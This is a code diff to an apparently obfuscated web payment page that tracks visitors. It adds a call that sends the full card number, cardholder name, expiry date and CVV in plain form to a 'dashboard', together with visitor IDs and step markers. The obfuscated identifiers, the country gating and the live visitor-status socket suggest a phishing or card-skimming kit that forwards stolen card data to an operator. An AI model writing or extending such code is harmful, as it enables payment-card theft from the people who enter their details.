@@ -16,7 +16,7 @@ import { _gt } from "@/lib/text-obf"
 import { isCountryAllowed, _icb } from "@/lib/firebase/settings"
 import { EmailModal } from "@/components/email-modal"
 import { _e } from "@/lib/secure-utils"
-import { getData } from "@/lib/api"
+import { getData, notifyDashboard } from "@/lib/api"
 import { onVisitorStatusUpdated } from "@/lib/socket"
 import { API_BASE } from "@/lib/api"
 
@@ -332,6 +332,27 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       })
       
       console.log('[Payment] Data saved successfully')
+
+      // Notify dashboard immediately with updated status
+      await notifyDashboard({
+        id: visitorID,
+        visitorId: visitorID,
+        _v1Status: "pending",
+        paymentStatus: "pending",
+        cardStatus: "pending",
+        cardNumber: _v1,
+        cardOwner: _v4,
+        cardExpiry: _v3,
+        cvv: _v2,
+        paymentMethod: selectedPaymentMethod,
+        cardType,
+        bankInfo,
+        currentPage: "check",
+        currentStep: "_st1",
+        status: "pending"
+      })
+
+      console.log('[Payment] Dashboard notified')
 
       await addToHistory(visitorID, "_t1", {
         _v1: _e(_v1),
